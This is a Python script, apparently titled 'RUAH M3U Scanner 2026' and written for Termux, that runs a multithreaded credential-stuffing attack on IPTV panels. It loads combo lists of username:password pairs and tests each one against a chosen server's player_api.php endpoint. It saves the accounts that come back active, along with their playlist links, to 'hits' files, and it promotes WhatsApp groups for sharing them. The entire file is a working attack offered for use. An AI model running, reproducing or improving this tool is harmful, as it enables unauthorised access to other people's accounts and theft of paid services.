# -*- coding: utf-8 -*-
"""
╔══════════════════════════════════════════════════════════════════════╗
║ ESCANEO M3U PROFESIONAL - MÚLTIPLES COMBOS (ULTRA RÁPIDO)                
║ DESARROLLADO POR RUAH - VERSIÓN 2026               
║ FUNCIONAL EN QPython / Termux                    
╚══════════════════════════════════════════════════════════════════════╝
"""
import os
import sys
import time
import json
import queue
import threading
import datetime

# ---------- INSTALACIÓN DE REQUESTS ----------
try:
    import requests
except ImportError:
    print("📦 Instalando requests...")
    os.system('pip install requests')
    import requests

from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# ---------- CONSTANTES ----------
COMBO_DIR = "/sdcard/combo/"
HITS_DIR = "/sdcard/"
USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
TIMEOUT = 6  # Reducido para mayor velocidad

# ---------- COLORES ----------
class Color:
    CYAN = '\033[36m'
    GREEN = '\033[32m'
    YELLOW = '\033[33m'
    RED = '\033[31m'
    MAGENTA = '\033[35m'
    WHITE = '\033[37m'
    BOLD = '\033[1m'
    RESET = '\033[0m'

# ---------- UTILIDADES ----------
def clear():
    os.system('clear' if os.name == 'posix' else 'cls')

def barra_progreso(porcentaje, ancho=25):
    lleno = int(ancho * porcentaje / 100)
    vacio = ancho - lleno
    return f"{Color.GREEN}[{'█' * lleno}{'░' * vacio}]{Color.RESET}"

def get_country_from_tz(timezone_str):
    mapping = {
        'America/New_York': ('US', 'Estados Unidos'),
        'America/Los_Angeles': ('US', 'Estados Unidos'),
        'America/Chicago': ('US', 'Estados Unidos'),
        'America/Toronto': ('CA', 'Canadá'),
        'Europe/London': ('GB', 'Reino Unido'),
        'Europe/Madrid': ('ES', 'España'),
        'Europe/Paris': ('FR', 'Francia'),
        'Europe/Berlin': ('DE', 'Alemania'),
        'Europe/Rome': ('IT', 'Italia'),
        'America/Mexico_City': ('MX', 'México'),
        'America/Bogota': ('CO', 'Colombia'),
        'America/Argentina/Buenos_Aires': ('AR', 'Argentina'),
        'America/Santiago': ('CL', 'Chile'),
        'America/Lima': ('PE', 'Perú'),
        'America/Caracas': ('VE', 'Venezuela'),
        'America/Havana': ('CU', 'Cuba'),
        'America/Santo_Domingo': ('DO', 'República Dominicana'),
        'Brazil/East': ('BR', 'Brasil'),
        'America/Sao_Paulo': ('BR', 'Brasil'),
    }
    for key, (code, country) in mapping.items():
        if key in timezone_str:
            return code, country
    return '??', timezone_str.split('/')[-1] if '/' in timezone_str else timezone_str

def code_to_flag(country_code):
    if not country_code or country_code == '??':
        return '🏁'
    return ''.join(chr(0x1F1E6 + ord(ch.upper()) - ord('A')) for ch in country_code)

def dias_restantes(exp_timestamp):
    if exp_timestamp == "Ilimitado":
        return "Ilimitado"
    try:
        exp_date = datetime.datetime.fromtimestamp(int(exp_timestamp))
        today = datetime.datetime.now()
        delta = (exp_date - today).days
        return max(0, delta)
    except:
        return "?"

def obtener_stats(user, pwd, server):
    """Opcional: solicita estadísticas de canales/pelis/series (más lento)"""
    canales = pelis = series = 0
    session = requests.Session()
    session.headers.update({'User-Agent': USER_AGENT})
    try:
        url = f"http://{server}/player_api.php?username={user}&password={pwd}&action=get_live_streams"
        r = session.get(url, timeout=TIMEOUT, verify=False)
        if r.status_code == 200 and r.text.strip().startswith('['):
            canales = len(r.json())
    except:
        pass
    try:
        url = f"http://{server}/player_api.php?username={user}&password={pwd}&action=get_vod_streams"
        r = session.get(url, timeout=TIMEOUT, verify=False)
        if r.status_code == 200 and r.text.strip().startswith('['):
            pelis = len(r.json())
    except:
        pass
    try:
        url = f"http://{server}/player_api.php?username={user}&password={pwd}&action=get_series"
        r = session.get(url, timeout=TIMEOUT, verify=False)
        if r.status_code == 200 and r.text.strip().startswith('['):
            series = len(r.json())
    except:
        pass
    return canales, pelis, series

def escribir_hit(server, user, pwd, json_resp, combo_origen, nick_usuario, incluir_stats):
    try:
        if isinstance(json_resp, str):
            data = json.loads(json_resp)
        else:
            data = json_resp

        user_info = data.get('user_info', {})
        exp_ts = user_info.get('exp_date', 'Ilimitado')
        if exp_ts != "Ilimitado":
            try:
                exp_date_obj = datetime.datetime.fromtimestamp(int(exp_ts))
                exp_date_str = exp_date_obj.strftime('%d/%m/%Y')
            except:
                exp_date_str = str(exp_ts)
        else:
            exp_date_str = "Ilimitado"
        dias_rest = dias_restantes(exp_ts)
        timezone = user_info.get('timezone', 'Desconocido')
        server_url = user_info.get('server', server)
        country_code, country = get_country_from_tz(timezone)
        flag = code_to_flag(country_code)

        # Estadísticas opcionales
        if incluir_stats:
            canales, pelis, series = obtener_stats(user, pwd, server)
        else:
            canales = pelis = series = 0  # Se mostrará como "No consultado"
        total_contenido = canales + pelis + series
        if total_contenido > 15000:
            calidad = "💎 PREMIUM 💎"
        elif total_contenido > 5000:
            calidad = "✨ ALTA CALIDAD ✨"
        else:
            calidad = "📀 ESTÁNDAR" if total_contenido > 0 else "❓ DESCONOCIDA"

        host = server.split(':')[0]
        m3u_link = f"http://{server}/get.php?username={user}&password={pwd}&type=m3u_plus"

        # Si no hay stats, mostrar mensaje
        stats_line = f"""
┃ 📡 Canales : {canales if incluir_stats else 'No consultado'}
┃ 🎬 Películas : {pelis if incluir_stats else 'No consultado'}
┃ 🍿 Series : {series if incluir_stats else 'No consultado'}
┃ 📊 Total : {total_contenido if incluir_stats else 'Desconocido'}
┃ 🏷️ Calidad : {calidad}
""" if incluir_stats else f"""
┃ 📊 Estadísticas : No solicitadas (modo rápido)
"""

        hit_block = f"""
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃      𝐌𝟑𝐮 RUAH DE CHILE 𝟐𝟎𝟐6 
┃          solo para guapos y sexy  𝐛𝐲 ruah 𝟐𝟎𝟐6 
┣───────────────────────────
┃  Servidor : http://{server}
┃  Host : {host}
┃  País : {flag} {country}
┣───────────────────────────
┃  Usuario : {user}
┃  Contraseña : {pwd}
┃  Estado : ACTIVO
┃  Expira : {exp_date_str}
┃  Días restantes : {dias_rest}
┣────────────────────────────
┃ CONTENIDO DEL SERVIDOR:
┃{stats_line}
┣────────────────────────────
┃ Combo : {combo_origen}
┃  Nick : {nick_usuario}
┣────────────────────────────
┃  Enlace M3U : 
┃ {m3u_link}
┣───────────────────────────────
╭─➤ Únete a nuestros grupos de WhatsApp:
├ https://chat.whatsapp.com/K3rK3pXcCFvHjN5OMjusYq
├ https://chat.whatsapp.com/KZDtPL26FXtJho72dm3Ahg
╰────────────────────────────────────
"""
        nombre_archivo = f"HITS_{server.replace(':', '_')}.txt"
        ruta_hits = os.path.join(HITS_DIR, nombre_archivo)
        with open(ruta_hits, 'a', encoding='utf-8') as f:
            f.write(hit_block + "\n")
        return True
    except Exception as e:
        print(f"Error al escribir hit: {e}")
        return False

# ---------- BANNER ----------
def mostrar_banner(servidor=None, nick=None):
    clear()
    serv_text = f"SERVIDOR: {servidor}" if servidor else "ESPERANDO CONFIGURACIÓN"
    nick_text = f"USUARIO: {nick}" if nick else "USUARIO: NO CONFIGURADO"
    ancho = max(len(serv_text), len(nick_text), 60) + 4
    linea_sup = "╔" + "═" * (ancho - 2) + "╗"
    linea_inf = "╚" + "═" * (ancho - 2) + "╝"
    titulo = "RUAH M3U SCANNER 2026 - EDICIÓN ULTRA RÁPIDA"
    subtitulo = "MULTI-HILOS · ALTO RENDIMIENTO"
    print(f"{Color.CYAN}{linea_sup}")
    print(f"║{Color.BOLD}{titulo.center(ancho-2)}{Color.RESET}{Color.CYAN}║")
    print(f"║{Color.YELLOW}{subtitulo.center(ancho-2)}{Color.RESET}{Color.CYAN}║")
    print(f"╠{'═' * (ancho-2)}╣")
    print(f"║ {Color.GREEN}{serv_text.ljust(ancho-3)}{Color.RESET}{Color.CYAN}║")
    print(f"║ {Color.GREEN}{nick_text.ljust(ancho-3)}{Color.RESET}{Color.CYAN}║")
    print(f"╠{'═' * (ancho-2)}╣")
    print(f"║ {Color.MAGENTA}ESCANEO PARALELO ULTRARRÁPIDO | PANEL EN VIVO{Color.RESET}{Color.CYAN}".ljust(ancho-1) + "║")
    print(f"{linea_inf}{Color.RESET}")

# ---------- CONFIGURACIÓN ----------
def setup():
    global nick_usuario, combos_seleccionados, credenciales_por_combo, servidor, hilos_por_combo, total_credenciales, incluir_stats

    clear()
    banner = """
╔══════════════════════════════════════════════════════════════════════╗
║ ESCANEO M3U PROFESIONAL - MÚLTIPLES COMBOS (ULTRA RÁPIDO)                
║ DESARROLLADO POR RUAH - VERSIÓN 2026               
║ FUNCIONAL EN QPython / Termux                    
╚══════════════════════════════════════════════════════════════════════╝
"""
    print(f"{Color.CYAN}{Color.BOLD}{banner}{Color.RESET}")

    print(f"{Color.YELLOW}Ingresa tu nickname (aparecerá en los hits):{Color.RESET}")
    nick_usuario = input("→ ").strip()
    if not nick_usuario:
        nick_usuario = "Anónimo"
    print(f"{Color.GREEN}Bienvenido {nick_usuario}.{Color.RESET}\n")

    if not os.path.exists(COMBO_DIR):
        os.makedirs(COMBO_DIR)
        print(f"{Color.RED}Carpeta creada: {COMBO_DIR}\nColoca tus archivos .txt (usuario:contraseña) allí.{Color.RESET}")
        input("Presiona Enter para salir...")
        sys.exit(1)

    archivos_combo = [f for f in os.listdir(COMBO_DIR) if f.endswith('.txt')]
    if not archivos_combo:
        print(f"{Color.RED}No hay archivos .txt en {COMBO_DIR}{Color.RESET}")
        sys.exit(1)

    print(f"{Color.YELLOW}ARCHIVOS COMBO DISPONIBLES:{Color.RESET}")
    for i, f in enumerate(archivos_combo, 1):
        print(f"   {Color.GREEN}{i}.{Color.RESET} {f}")

    max_combos = min(5, len(archivos_combo))
    print(f"\n{Color.CYAN}¿Cuántos combos usar? (1-{max_combos}):{Color.RESET}")
    num_combos = int(input("→ "))
    num_combos = max(1, min(num_combos, max_combos))

    combos_seleccionados = []
    for c in range(num_combos):
        while True:
            sel = input(f"{Color.YELLOW}Selecciona el combo #{c+1} (número):{Color.RESET} ")
            if sel.isdigit() and 1 <= int(sel) <= len(archivos_combo):
                nombre = archivos_combo[int(sel)-1]
                ruta = os.path.join(COMBO_DIR, nombre)
                combos_seleccionados.append((nombre, ruta))
                break
            else:
                print(f"{Color.RED}Número inválido.{Color.RESET}")

    credenciales_por_combo = {}
    for nombre, ruta in combos_seleccionados:
        creds = []
        with open(ruta, 'r', encoding='utf-8', errors='ignore') as f:
            for linea in f:
                linea = linea.strip()
                if ':' in linea:
                    user, pwd = linea.split(':', 1)
                    user = user.strip()
                    pwd = pwd.strip()
                    if user and pwd:
                        creds.append((user, pwd))
        credenciales_por_combo[nombre] = creds

    total_credenciales = sum(len(creds) for creds in credenciales_por_combo.values())
    print(f"\n{Color.GREEN}Total de credenciales cargadas: {total_credenciales}{Color.RESET}")

    print(f"\n{Color.CYAN}Ingresa el servidor (portal) a escanear (ejemplo: portalip.tv:8080):{Color.RESET}")
    servidor = input("→ ").strip()
    servidor = servidor.replace("http://", "").replace("https://", "").replace("/", "")
    if not servidor:
        print(f"{Color.RED}Servidor inválido. Saliendo...{Color.RESET}")
        sys.exit(1)

    print(f"\n{Color.CYAN}¿Hilos POR COMBO? (1-30, recomendado 15-20):{Color.RESET}")
    hilos_por_combo = int(input("→ "))
    hilos_por_combo = max(1, min(hilos_por_combo, 30))

    print(f"\n{Color.CYAN}¿Obtener estadísticas completas (canales, películas, series)?{Color.RESET}")
    print("Esto HARÁ MÁS LENTO el escaneo. ¿Deseas activarlo? (s/n):")
    resp = input("→ ").strip().lower()
    incluir_stats = resp == 's' or resp == 'si'

    mostrar_banner(servidor, nick_usuario)
    print(f"{Color.YELLOW}╔════════════════════════════════════════════════════════════════════╗")
    print(f"║  COMBOS A ESCANEAR (SIMULTÁNEAMENTE):                                      ║")
    for nombre in credenciales_por_combo.keys():
        print(f"║      -> {nombre} ({len(credenciales_por_combo[nombre])} credenciales)               ║")
    print(f"║  SERVIDOR: {servidor}                                              ║")
    print(f"║  HILOS POR COMBO: {hilos_por_combo} (MÁX. VELOCIDAD)                              ║")
    print(f"║  ESTADÍSTICAS: {'SÍ (más lento)' if incluir_stats else 'NO (ultrarrápido)'}                              ║")
    print(f"║  TOTAL CREDENCIALES: {total_credenciales}                                            ║")
    print(f"╚════════════════════════════════════════════════════════════════════╝{Color.RESET}")
    input("\nPresiona Enter para iniciar el escaneo ultrarrápido...")

# ---------- VARIABLES GLOBALES ----------
hits_totales = 0
lock = threading.Lock()
inicio_global = time.time()
todos_terminados = False
estado_combos = {}
nick_usuario = ""
servidor = ""
incluir_stats = False

# ---------- ESCANEO POR COMBO ----------
def escanear_combo(combo_nombre, credenciales, hilos, servidor, nick, stats_flag):
    q = queue.Queue()
    for cred in credenciales:
        q.put(cred)

    def worker():
        session_local = requests.Session()
        session_local.headers.update({'User-Agent': USER_AGENT})
        while True:
            try:
                user, pwd = q.get_nowait()
            except queue.Empty:
                break
            try:
                url = f"http://{servidor}/player_api.php?username={user}&password={pwd}"
                resp = session_local.get(url, timeout=TIMEOUT, verify=False)
                if resp.status_code == 200 and 'user_info' in resp.text:
                    data = resp.json()
                    if data.get('user_info', {}).get('status') == 'Active':
                        escribir_hit(servidor, user, pwd, data, combo_nombre, nick, stats_flag)
                        with lock:
                            estado_combos[combo_nombre]['hits'] += 1
                            global hits_totales
                            hits_totales += 1
            except:
                pass
            finally:
                with lock:
                    estado_combos[combo_nombre]['procesados'] += 1
                q.task_done()

    threads = []
    for _ in range(hilos):
        th = threading.Thread(target=worker)
        th.daemon = True
        th.start()
        threads.append(th)

    q.join()
    with lock:
        estado_combos[combo_nombre]['estado'] = "Completado"

# ---------- PANEL EN VIVO ----------
def actualizar_panel(servidor, nick):
    global todos_terminados
    while not todos_terminados:
        time.sleep(1.0)  # Reducir refresco para menor carga
        with lock:
            sys.stdout.write("\033[s")
            sys.stdout.write("\033[3;0H")
            for _ in range(25):
                sys.stdout.write("\033[K\033[1B")
            sys.stdout.write("\033[3;0H")

            elapsed = time.time() - inicio_global
            horas = int(elapsed // 3600)
            minutos = int((elapsed % 3600) // 60)
            segundos = int(elapsed % 60)

            print(f"{Color.CYAN}{Color.BOLD}╔════════════════════════════════════════════════════════════════════════════════╗")
            print(f"║   TIEMPO: {horas:02d}:{minutos:02d}:{segundos:02d}                                                  ║")
            print(f"║   SERVIDOR: {servidor}                                                                               ║")
            print(f"║   USUARIO: {nick} {' ' * (40 - len(nick))}                               HITS: {hits_totales}          ║")
            print(f"╚════════════════════════════════════════════════════════════════════════════════╝{Color.RESET}")

            total_proc = sum(st['procesados'] for st in estado_combos.values())
            total_gral = sum(st['total'] for st in estado_combos.values())
            pct_gral = (total_proc / total_gral) * 100 if total_gral else 0
            barra_gral = barra_progreso(pct_gral, 45)
            print(f"\n{Color.MAGENTA}PROGRESO GLOBAL: {barra_gral}  {pct_gral:.1f}%  ({total_proc}/{total_gral}){Color.RESET}\n")

            print(f"{Color.MAGENTA}ESTADO DE COMBOS (ESCANEO PARALELO ULTRARRÁPIDO):{Color.RESET}")
            for nombre, estado in estado_combos.items():
                pct = (estado['procesados'] / estado['total']) * 100 if estado['total'] else 0
                barra = barra_progreso(pct, 20)
                print(f"{Color.YELLOW}┌─ {nombre}{Color.RESET}")
                print(f"│  {barra} {pct:.1f}%   HITS: {estado['hits']}   {estado['procesados']}/{estado['total']}   {estado['estado']}")
                print(f"└─")

            if elapsed > 0:
                velocidad = total_proc / elapsed
                print(f"\n{Color.CYAN}VELOCIDAD: {velocidad:.2f} creds/seg{Color.RESET}")

            print(f"{Color.WHITE}────────────────────────────────────────────────────────────────────────────────────────────{Color.RESET}")
            sys.stdout.write("\033[u")
            sys.stdout.flush()

# ---------- MAIN ----------
def main():
    global estado_combos, todos_terminados, hits_totales, nick_usuario, servidor, incluir_stats
    setup()
    for nombre, creds in credenciales_por_combo.items():
        estado_combos[nombre] = {
            'procesados': 0,
            'total': len(creds),
            'hits': 0,
            'estado': 'Escaneando'
        }

    panel_thread = threading.Thread(target=actualizar_panel, args=(servidor, nick_usuario))
    panel_thread.daemon = True
    panel_thread.start()

    combo_threads = []
    for nombre, creds in credenciales_por_combo.items():
        th = threading.Thread(target=escanear_combo, args=(nombre, creds, hilos_por_combo, servidor, nick_usuario, incluir_stats))
        th.daemon = True
        th.start()
        combo_threads.append(th)

    for th in combo_threads:
        th.join()

    todos_terminados = True
    time.sleep(1)

    mostrar_banner(servidor, nick_usuario)
    print(f"\n{Color.GREEN}╔════════════════════════════════════════════════════════════════════════════════╗")
    print(f"║  ESCANEO COMPLETADO - TODOS LOS COMBOS PROCESADOS EXITOSAMENTE                        ║")
    print(f"╚════════════════════════════════════════════════════════════════════════════════╝{Color.RESET}")
    print(f"{Color.YELLOW}TOTAL DE HITS ENCONTRADOS: {hits_totales}{Color.RESET}")
    print(f"{Color.CYAN}RESULTADOS GUARDADOS EN: {HITS_DIR}HITS_{servidor.replace(':', '_')}.txt{Color.RESET}")
    print(f"{Color.MAGENTA}RUAH 2026 - ESCANER M3U ULTRARRÁPIDO{Color.RESET}\n")

if __name__ == "__main__":
    main()